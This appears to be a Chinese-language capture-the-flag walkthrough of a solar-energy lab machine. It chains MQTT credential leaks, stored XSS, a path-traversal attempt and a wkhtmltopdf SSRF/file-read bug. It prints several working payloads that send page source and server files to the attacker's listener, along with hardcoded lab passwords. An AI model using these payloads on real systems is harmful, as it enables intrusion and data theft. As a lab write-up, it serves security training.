
##### 开放了443的web服务

#### 直接去浏览器看证书可以，用nmap看证书也可以

![](images/2026-10-19-12-22-22-image.png)

![](images/2026-10-19-12-22-57-image.png)

#### 很多域名可以用同一个证书,把自己拥有的域名都用同一个证书

**SAN（Subject Alternative Name，主题备用名称）** 字段

#### 存放的就是使用这个证书的所有域名

##### 

##### 爆破出登录页

![](images/2026-10-19-12-45-52-image.png)

#### 爆破出一个压缩包

![](images/2026-10-19-12-53-24-image.png)

##### 下载后查看

![](images/2026-10-19-13-11-25-image.png)

破解

![](images/2026-10-19-13-12-17-image.png)

但是www.sunfriends.nyx的这个登录框登不进

##### 去登录

#### www.solar.nyx 成功了,但是啥都没有，那就看源码

![](images/2026-10-19-13-14-57-image.png)

没登录之前源码是这样的

![](images/2026-10-19-13-16-10-image.png)

登录后源码偷偷藏了一些私货

```bash
<!--<script src="/mqtt.min.js"></script>-->

    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'

        let userName = "calvin";
        let userRole = "user";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;


            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);
```

##### ![](images/2026-10-19-13-38-29-image.png)

##### 会websocket升级,这个请求头大概能猜出是隧道用的websocket 然后里面跑着mqtt协议

![](images/2026-10-19-13-37-18-image.png)

### 核心工作原理：发布/订阅模式（Pub/Sub）

**和 HTTP 的区别**：HTTP 是“你问我答”（前端主动去请求数据），MQTT 是“**服务器主动推送**”（有数据了，Broker 立刻把消息发给所有订阅者，极其高效）。

网站订阅了`data`这内容

![](images/2026-10-19-13-50-23-image.png)

### 用的innerHTML函数，会把HTML内容用js来执行的,可能存在xss

![](images/2026-10-19-13-39-09-image.png)

#### 

#### ![](images/2026-10-19-17-45-11-image.png)

#### 先连接上去看看

```bash
mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG" 
```

#### 发现后端上游一直在给broker发json,然后前端订阅这个Topics 为data文件，broker再发给前端web

`硬件设备 -> Broker -> 前端网页`。前端网页**完全信任**来自 `data` 主题的数据，因为它默认这些数据是安全的硬件发来的

### 按住shift 鼠标左键选择想要复制的内容，松开左键或者不松，按 `Ctrl + Shift + C`就可以在这个控制面板复制了，其他控制面板同样也可以

![](images/2026-10-19-18-18-25-image.png)

### 刚才的js源码

![](images/2026-10-19-18-25-52-image.png)

### 直接把从broker发来的两个字段的数据放进innerHTML函数里执行

![](images/2026-10-19-18-29-59-image.png)

#### 向broker写入payload,测试触发

```bash
mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG" --insecure publish "data" '{"solarEnergy": "<img src=x onerror=alert(1)>"}'
```

![](images/2026-10-19-18-44-16-image.png)

#### 弹窗了

**`HttpOnly`：** 响应头：不允许前端js在前台带cookie出来，如document.cookie，只允  许    后台带cookie

**`Secure`**：告诉浏览器，这个 Cookie 只能通过 HTTPS 加密通道传输，防止在普通 HTTP 下被中间人抓包。

**`SameSite=Strict`**：

##### 

### web权限隔离：

#### **普通用户和管理员看到的页面不一样，是因为服务器（后端）发给他们的 HTML 代码本来就不同**，这个大概是cookie在做身份标识作用

#### 现在只能盲打xss外带cookie或者管理员源码，因为我们之前用普通用户登录上后台，能看到普通用户后台源码泄露敏感信息，那管理员的源码可能也会泄露敏感信息，

### 如果管理员也订阅了这个data 主题 内容，那就可以执行我们的payload

##### 本地python3开个http服务，外带的源码或者cookie放在？后面的键值对作为传参形式带来,html用basee64编码，还有要外带管理员的后台url,用url编码，

##### 发GET请求

**JavaScript 原生的 `btoa()` 不能直接编码包含`中文`的字符串**

想要编码中文的话，先在里面加上一层`encodeURIComponent`

像这样 `btoa(encodeURIComponent(document.body.outerHTML))`

- **`encodeURI(整段网址)`**：
  
  - **用途**：编码整个 URL。
  
  - **特点**：它**不会**编码 URL 里的特殊功能符号，比如 `http://` 里的 `://`，或者 `?`、`&`、`=`。
  
  - **场景**：如果你要把一个完整的网址作为参数传给另一个网页。

- **`encodeURIComponent(单独的参数值)`**：
  
  - **用途**：编码 URL 里的某一个参数值（比如你要传的 HTML 源码或 Cookie）。
  
  - **特点**：它**极其严格**，会把所有特殊字符（包括 `&`、`=`、`/`、`?`）全部编码（变成 `%26`、`%3D` 等）。
  
  - **场景**：当你要把一大段包含特殊符号的文本（比如 HTML）塞进 `?data=` 后面时，**必须用这个**。如果不小心用了 `encodeURI`，HTML 源码里如果有个 `&` 符号，服务器就会以为这是另一个参数的分隔符，导致后面的数据全部截断丢失。

```javascript
<img src=x onerror="location.href='http://192.168.56.1:8000?datas='btoa(document.body.outerHTML)">
```

## **强制跳转**：`location.href `,设置url的，然后直接跳转

### 默认都是GET请求

## 也可以用POST请求，把内容放进请求体就好了

#### 偷到管理员页面的源码

```bash
<script type="module">
        import mqtt from '/mqtt.js'

        let userName = "JulianAdm";
        let userRole = "admin";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });

        有mqtt的密码了，可以上去看看
```

```bash
// Function to send the record
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';


                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
```

发现一个新的Topic : `record`

![](images/2026-10-20-13-32-34-image.png)

![](images/2026-10-20-13-56-04-image.png)

## 还有个用链接来做按钮

## 可能是查看record 订阅内容的，但是后面看到源码后，才能验证

### `Records`和 `Send record`是两个不同链接

###### `Send record`点击会触发sendrecord()函数，向后端的borker发送`json(base64(页面截图))`内容

###### `Records`点击会触发路由进入/records

## 现在也不知道/records里面有啥，再用xss 发送能同源请求 让管理员进入/records页，然后再读源码带回

### 用fetch函数，请求后成功后，服务端会返回一个响应对象，定义了很多方法在里面

### 用一个变量名字接住这个响应对象，调用这个对象的方法，这个对象里所有内容变成文本形式

#### 用Image()这个函数会触发https升级，让https的页面向http发请求这个是握手包

```
<img src=x onerror="fetch('/records/').then(r=>r.text()).then(t=>{(new Image()).src='http://192.168.56.1:8000/?data='+btoa(encodeURIComponent(t));})" />
```

![](images/2026-10-20-15-05-20-image.png)

#### 但是后面用同样的Image payload做xss就没有升级https,还啥响应都没有，确认过payload已经传到目标的浏览器里吗，不是到为啥

#### 把Image改成location.href就能绕过

![](images/2026-10-20-16-06-53-image.png)

## 解码先解码base64 再去网站解码url

![](images/2026-10-20-16-15-20-image.png)

#### 区别：

|         | `new Image().src` | `location.href` |
| ------- | ----------------- | --------------- |
| 页面会不会跳走 | 不会，后台静默发请求        | 会，页面跳转到你的服务器    |
| 混合内容限制  | 可能被拦              | 不受限制            |
| 能不能收到数据 | 不确定               | 验证过能用           |

如果你在意"页面不跳走、更隐蔽"，就用 `new Image().src`，先试试能不能收到数据；如果收

### 这是records页面的源码

```html
<!DOCTYPE html>
<html>

<head>
    <title>List of Solar Energy Data</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style3.css">
</head>

<body>
    <div style="min-width:400px;background:white;padding:15px;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <div style="text-align:center;"><object class="solar-icon" data="../sun.svg" type="image/svg+xml" style="width:75px;"></object></div>
        <h1>List of Solar Energy Data</h1>
        <table>
            <tr>
                <th>Record</th>
                <th>Actions</th>
            </tr>
                            <tr>
                    <td>2024-09-02T23:15:11.396Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A15%3A11.396Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:18:15.742Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A18%3A15.742Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:18:44.091Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A18%3A44.091Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:24:33.828Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A24%3A33.828Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:24:44.800Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A24%3A44.800Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:25:15.961Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A25%3A15.961Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:29:14.124Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A29%3A14.124Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                    </table>
        <a href="../dashboard.php" class="logout-link">< Back</a>
    </div>
</body>

</html>
```

#### 只需要关注

```bash
 <a href="?download=true&file=2024-09-02T23%3A25%3A15.961Z.json" class="download-btn">Download PDF</a>
```

## 这个后端从前端传的file字段拿文件名字，去目录里面找，找到后把对应文件，返回给前端

## 上面源码对应每一条下载链接都能点击，然后向后端下载，

### 后端可能会将file字段直接拼接到文件路径里,去找文件，没对file字段的内容进行过滤，找到后直接返回给我们

#### 所以可能存在任意文件读取或者叫路径穿越漏洞（**Path Traversal**）

```php
$filename = "/var/www/html/records/" . $_GET['file'];
```

### 不过这是管理员的后台页面,会有权限标志，我们无法直接浏览器访问`records/?download=true&file=payload`

![](images/2026-10-20-18-54-04-image.png)

### 回车后跳转到认证页面

![](images/2026-10-20-18-53-55-image.png)

#### 还是需要用xss来触发,

```bash
<img src=x onerror="fetch('/records/?download=true&file=../../../../../etc/passwd').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />
```

### 读到了

![](images/2026-10-20-18-23-04-image.png)

![](images/2026-10-20-18-24-18-image.png)

#### 文件未找到，哈哈哈，读错了，不过证明真的能路径穿越读任意文件

![](images/2026-10-20-18-32-40-image.png)

### 我们先下载一个.json文件看一下，因为黑盒读不出

## 用GET请求回带，内容太长，无法显示

```bash
#GET回传
payload_html = '''<img src=x onerror="fetch('/records?download=true&file=2024-09-02T23%3A29%3A14.124Z.json').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />'''
```

`btoa(encodeURIComponent(t))` 

### encodeURIComponet会把字符扩长，撞 414,长度超出

![](images/2026-10-20-18-55-17-image.png)

#### 改为POST请求，内容放请求体里带回

### 测试了很多次，用fetch向攻击者发POST请求，啥也没收到，因该是目标浏览器把这个从https的页面连接一个http的页面视为不安全的行为，也没有握手升级包回显，直接丢弃了这个请求，所以这个靶场只能用location.href这个来用GET请求带出pdf文件，

```
<img src=x onerror=\"(async () => {const b = await (await fetch('/records/?download=true&file=文件名字')).arrayBuffer(); const t = String.fromCharCode(...new Uint8Array(b)); location.href='http://192.168.56.1:8000/?data='+btoa(t);})();\" />
```

### `btoa(String.fromCharCode(...))` → 最紧凑的编码 ,可以放下GET,不报414,长度超出

#### 

#### 这个就是拿到的pdf,转换为文本形式后，啥也没有

![](images/2026-10-21-17-08-46-image.png)

![](images/2026-10-21-13-45-18-image.png)

### 再看一下pdf文件元数据

![](images/2026-10-21-17-20-30-image.png)

#### 这个pdf生成器允许加载外部资源来生成pdf

![](images/2026-10-21-17-46-43-image.png)

### ![](images/2026-10-21-17-49-49-image.png)

#### 这个生成的pdf从前端拿数据的

## 在现实中，这个系统通常由三个完全物理隔离的部分组成：

1. **边缘设备（Edge Device）**：
   
   - 这就是真正连接着太阳能板和电表的树莓派或 PLC。
   
   - 它每隔 2 秒计算一次发电量，作为 MQTT 客户端（Publisher），把数据 `{"solarEnergy": 104...}` 发到云端 Broker 的 `data` 主题。

2. **MQTT Broker（消息中枢）**：
   
   - 部署在云端或机房，负责接收设备的数据，并广播给所有订阅者。

3. **Web 服务器（前端 + 后端）**：
   
   - **前端**：你的浏览器打开网页，连上 Broker 订阅 `data` 主题。图表动起来了。
   
   - **后端（生成 PDF）**：管理员觉得当前图表很有价值，点击`send-record-id`对应按钮。前端把**当前的数据**和**当前图表的截图**打包，发给 Broker 的 `record` 主题。后端服务器订阅了 `record` 主题，收到数据后，调用 `wkhtmltopdf` 存入服务器硬盘。
   
   - ![](images/2026-10-21-18-10-03-image.png)

## 在这台靶机里，全部塞到同一台机器里面了，理解业务逻辑有点困难

#### 从前面可以看出,传到后端的数据是被`wkhtmltopdf 0.12.6.1`这个pdf生成器处理的，刚好这里有个**CVE-2022-35583** —— SSRF

### 漏洞本质：处理前端传来的内容，时当成HTML来处理了，自然能执行js

**只要输入点最终会被当作 HTML 渲染，就可以尝试注入外部资源或本地文件协议**

```
// 1. 接收前端传来的 chart 数据
$chart = $_POST['chart']; 

// 2. 拼接 HTML 模板（这是开发者的常规操作）
$html = "<h1>Solar Energy Data</h1>";
$html .= "<img src='" . $chart . "'>"; // 把 Base64 塞进 img 标签

// 3. 把生成的 HTML 交给渲染引擎
exec("wkhtmltopdf data.html output.pdf");
```

#### 先去读一波的后端`处理`管理员网页请求的源码吧`index.php`

### 一般都是这个默认文件`Index.php`

## 用管理员连上mqtt后，是没有record这个Topic订阅的

![](images/2026-10-22-12-24-02-image.png)

### 但是之前的源码已经证明了是存在record这个Topic 的，因此

## 1.我们直接用mqtt客户端用管理员的身份向broker的record Topoic 发送恶意chart字段注入，

## 2.也可以用xss改web页chart字段的内容，再xss点击按钮发送，利用web前端的mqtt

# 现在用第一种方法

### 用图形界面直接在聊天框输入,或者写python脚本来发，

```bash
"time": "2026-01-02T23:29:14.012Z",
    "user": {"name": "JulianAdm", "role": "admin"},
    "solar": 232,
    "consumed": 223,
    "grid": -9,
    "chart": "<iframe src='http://192.168.56.1:8000'></iframe>" # 这里填你要测试的地址
```

## 发送后就出现了record主题

![](images/2026-10-22-13-45-20-image.png)

## 我的服务器没有接到请求

### 这个时候应该是pdf生成器没有生成这个图片，

### 结合之前的records页面，有个下载pdf按钮，是不是当我们点击下载，才会让pdf生成器，进行处理，

**服务器收到 `record` 数据后，不会立刻生成 PDF。**  
通常，后台还有一个逻辑：把这些数据存起来，等管理员去点“下载 PDF”时，才会把这段数据渲染成 PDF。

### 并且那个records页面从源码可以猜测出是个record主题的订阅历史，这些历史是后端broker发送来的，

### 我们刚才已经把消息发给后端的broker了，现在去看web是否有记录

```bash
<img src=x onerror="fetch('/records/').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />
```

![](images/2026-10-22-13-04-56-image.png)

#### 有了

#### 那就下载看一下会不会触发，

```bash

```

![](images/2026-10-22-13-51-45-image.png)

### 图片都被生成器渲染了，下载过来了，他就是不向我的服务器请求shell.php

#### 看这个版本的官方漏洞就是用**`<iframe>...<iframe>`**

### 可能环境问题，我们换`<script>...<script>`试试,

```bash
"chart": "\"><img src='http://192.168.56.1:8000/test'><x=\""
```

```bash
"chart": "\"><script>fetch('http://192.168.56.1:8000/test')</script>"<x=\""
```

#### 全部测试过了，只有img src可以，fetch函数不可以,用XMLHttpRequest代替fetch函数

![](images/2026-10-22-19-23-56-image.png)

#### `\`是用来转译的

#### 目标访问我的服务器了，注意payload一定要闭合html

### 后端直接拼接chart,要前后闭合`">...<x="`

`$html .= "<img src=" $chart ">"; // 直接把 chart 拼进 src 属性里`

```bash
// 1. 接收前端传来的数据
$data = json_decode($mqtt_message, true);
$chart = $data['chart'];

// 2. 拼接到 HTML 中（这就是漏洞所在！）
$html = "<html><body>";
$html .= "<h1>Solar Energy Data</h2>";
$html .= "<img src=" $chart ">"; // 直接把 chart 拼进 src 属性里
$html .= "</body></html>";

// 3. 交给 wkhtmltopdf 渲染
file_put_contents("report.html", $html);
exec("wkhtmltopdf report.html report.pdf");
```

```bash
"chart": "\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
```

#### 这里可以直接外带,`New Image()`不行，一定要用`<img src=...>`

## 可能是目标浏览器老旧，不支持现代new Image () API

我们之前测试`"chart": "\"><img src='http://192.168.56.1:8000/test'><x=\""`

是可以让目标访问我的服务器，所以New Image()外带不行，就换之前测试成功的来外带

```
"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/records/index.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
```

## 这不行那不行的，通关后我一定要看源码

#### 下面是作者另一种方式外带源码

### 读到的源码渲染成pdf图片，然后再去下载pdf

在真实的实战中，利用 PDF 生成漏洞时，经常遇到这种情况：

- 目标服务器在内网，**没有外网出口**（出不去你的 VPS）。

- 或者服务器配置了严格的防火墙，禁止访问外部 IP。

- 或者纯用 JS 发请求很容易被拦截。

#### **把数据渲染在 PDF 上**，是最稳妥的“带外（Out-of-Band）”通道

```
"chart": "\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
```

### /var/www/solar.nyx/records/index.php源码

```php
<?php
include("../session.php");

if (!isset($_SESSION['username']) || empty($_SESSION['username']) || $_SESSION['role'] != 'admin') {
    header("Location: /index.php");
    exit();
}



$directory = __DIR__ . '/'; // Directorio donde se encuentran los archivos JSON


$files = glob($directory . '*.json');
usort($files, function ($a, $b) {
    return filemtime($b) - filemtime($a);
});

$filesToKeep = array_slice($files, 0, 10);
$filesToDelete = array_slice($files, 10);

foreach ($filesToDelete as $file) {
    if (is_file($file)) {
        unlink($file);
    }
}

$jsonFiles = glob($directory . '*.json'); 


function generatePDF($data, $filename)
{
    $html = '<html><head><title>Solar Energy Data</title><style>
    .energy-meter {
        margin: 20px auto;
        text-align: center;
    }
    h1 { text-align: center; }
    </style></head><body>';
    $html .= '<div style="text-align:center;"><br><br><img src="/var/www/solar.nyx/sun.svg" width="250" height="150"></div><br><br>';
    $html .= '<h1>Solar Energy Data<br><small>' . htmlspecialchars($data['time']) . '</small></h1><br><br><br><div class="energy-meter"><img src="' . ($data['chart']) . '" /></div><br>';
    $html .= '<table border="0" cellpadding="4" style="margin-left:auto;margin-right:auto;">
                <tr>
                    <th align="right">Registered by user</th>
                    <td>' . htmlspecialchars($data['user']['name']) . ' (' . htmlspecialchars($data['user']['role']) . ')</td>
                </tr>
                <tr> 
                    <th align="right">Solar</th>
                    <td>' . htmlspecialchars($data['solar']) . '</td>
                </tr>
                <tr>
                    <th align="right">Consumed</th>
                    <td>' . htmlspecialchars($data['consumed']) . '</td>
                </tr>
                <tr>
                    <th align="right">Grid</th>
                    <td>' . htmlspecialchars($data['grid']) . '</td>
                </tr>
              </table>';
    $html .= '</body></html>';


    $tempHtmlFile = tempnam(sys_get_temp_dir(), 'html_') . '.html';
    file_put_contents($tempHtmlFile, $html);

    $outputPdfFile = sys_get_temp_dir() . '/' . $filename;
    $command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");

    $result = shell_exec($command . ' 2>&1');
    if ($result === null) {
        unlink($tempHtmlFile);
        throw new Exception('Error generate PDF: ' . $result);
    }

    unlink($tempHtmlFile);

    return $outputPdfFile;
}

if (isset($_GET['download']) && isset($_GET['file'])) {
    $file = basename($_GET['file']);
    $filePath = $directory . '/' . $file;

    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'json') {
        $data = json_decode(file_get_contents($filePath), true);
        if ($data === null) {
            http_response_code(400);
            echo 'Error read JSON.';
            exit;
        }

        try {
            $pdfFile = generatePDF($data, basename($file, '.json') . '.pdf');
            header('Content-Type: application/pdf');
            header('Content-Disposition: attachment; filename="' . basename($pdfFile) . '"');
            readfile($pdfFile);
            unlink($pdfFile);
            exit;
        } catch (Exception $e) {
            http_response_code(500);
            echo 'Error generate PDF: ' . $e->getMessage();
            exit;
        }
    } else {
        http_response_code(404);
        echo 'File not found.';
        exit;
    }
}

?>
<!DOCTYPE html>
<html>

<head>
    <title>List of Solar Energy Data</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style3.css">
</head>

<body>
    <div style="min-width:400px;background:white;padding:15px;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <div style="text-align:center;"><object class="solar-icon" data="../sun.svg" type="image/svg+xml" style="width:75px;"></object></div>
        <h1>List of Solar Energy Data</h1>
        <table>
            <tr>
                <th>Record</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($jsonFiles as $file): ?>
                <tr>
                    <td><?php echo htmlspecialchars(pathinfo($file, PATHINFO_FILENAME)); ?></td>
                    <td>
                        <a href="?download=true&file=<?php echo urlencode(basename($file)); ?>" class="download-btn">Download PDF</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
        <a href="../dashboard.php" class="logout-link">< Back</a>
    </div>
</body>

</html>
```

下面源码解释了之前读不到/etc/passwd

```bash
$command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
$result = shell_exec($command . ' 2>&1');
```

## 直接拼接chart字段

```php
$html .= '<div style="text-align:center;"><br><br><img src="/var/www/solar.nyx/sun.svg" width="250" height="150"></div><br><br>';
$html .= '<h1>Solar Energy Data<br><small>' . htmlspecialchars($data['time']) . '</small></h1><br><br><br><div class="energy-meter"><img src="' . ($data['chart']) . '" /></div><br>';
$html .= '<table border="0" cellpadding="4" style="margin-left:auto;margin-right:auto;">
```

```php
file_put_contents($tempHtmlFile, $html);

    $outputPdfFile = sys_get_temp_dir() . '/' . $filename;
    $command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
```

## 这里把上面从chart和其他字段拿到的数据做成的`$html`,调用`file_put_contents`函数，把`$html`放到`$tempHtmlFile`这个文件里

### 然后wkhtmltopdf这个pdf生成器,用这个`$tempHtmlFile`生成pdf图片

#### 下面是解释我们前面那个读/etc/passwd失败原因

```bash
#之前读/etc/passwd的paylod
<img src=x onerror="fetch('/records/?download=true&file=../../../../../etc/passwd').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />
```

```bash
#源码
if (isset($_GET['download']) && isset($_GET['file'])) {
    $file = basename($_GET['file']);
    $filePath = $directory . '/' . $file;

    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'json') {
```

`basename()` 防住了路径穿越,只读文件名，/etc/passwd,会被处理成passwd,然后去访问当前目录文件，发现没有这个文件，给我们返回404

强制要求 `PATHINFO_EXTENSION === 'json'`，不传 `.json` 结尾它不给你下载

下面这个说明只允许pdf生成器读`/var/www/` 这个个目录下的文件

```bash
$command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
```

![](images/2026-10-23-09-52-04-image.png)

## 从下面可以看出，session.php在上级目录,也就是`/var/www/solar.nyx` ，这个是用来验证前端是否用的admin身份发来的record，我们去读一下这个`session.php`

![](images/2026-10-23-09-59-56-image.png)

```bash
"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/sesion.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
```

### session.php 源码 ,

```bash
<?php

$secure = true; // if you only want to receive the cookie over HTTPS
$httponly = true; // prevent JavaScript access to session cookie
$samesite = 'Strict';

$nonce = bin2hex(random_bytes(16));

if (PHP_VERSION_ID < 70300) {
    session_set_cookie_params($maxlifetime, '/; samesite=' . $samesite, $_SERVER['HTTP_HOST'], $secure, $httponly);
} else {
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}


header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");


session_start();
```

### 回到之前目录扫描的结果，再去读一下login.php

![](images/2026-10-23-10-16-48-image.png)

### payload

```bash
"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/sesion.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
```

### login.php源码

```bash
<?php
include("session.php");


$servername = "127.0.0.1";
$username = "solar_user";
$password = "lD5vkvLfMowAiaT7w64C";
$dbname = "solar_energy_db";


try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);

    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $user = $_POST['username'];
        $pass = $_POST['password'];
        $hashed_pass = hash('sha256', $pass);
        $stmt = $conn->prepare("SELECT id, password, role FROM users WHERE username = :username");
        $stmt->bindParam(':username', $user);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($row) {
            if ($hashed_pass === $row['password']) {
                session_regenerate_id(true);
                $_SESSION['id'] = $row['id'];
                $_SESSION['username'] = $user;
                $_SESSION['role'] = $row['role'];
                header("Location: dashboard.php");
                exit();
            } else {
                header("Location: index.php?msg=" . urlencode("Invalid password."));
            }
        } else {
            header("Location: index.php?msg=" . urlencode("No user found with that username."));
        }
    }
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

$conn = null;
?>
```

### 直接把凭据硬编码到校验代码里做身份校验

### 内网才能访问这个login.php登录页

![](images/2026-10-23-10-20-59-image.png)

## 再读一下,sunfriends.nyx这个域名的/server.php

![](images/2026-10-23-10-28-53-image.png)

### server.php源码

```php
<?php
$secure = true;
$httponly = true;
$samesite = 'Strict';
$secret = [
    'user' => '5up3r',
    'pass' => 'bloods'
];

if (PHP_VERSION_ID < 70300) {
    session_set_cookie_params($maxlifetime, '/; samesite=' . $samesite, $_SERVER['HTTP_HOST'], $secure, $httponly);
} else {
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Verify credentials 
    if ($username === $secret['user'] && $password === $secret['pass']) {
        $_SESSION['loggedin'] = true;
        header('Location: server.php');
        exit;
    } else {
        $error = "Incorrect username or password.";
    }
}

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // Handle logout
    if (isset($_POST['logout'])) {
        session_destroy();
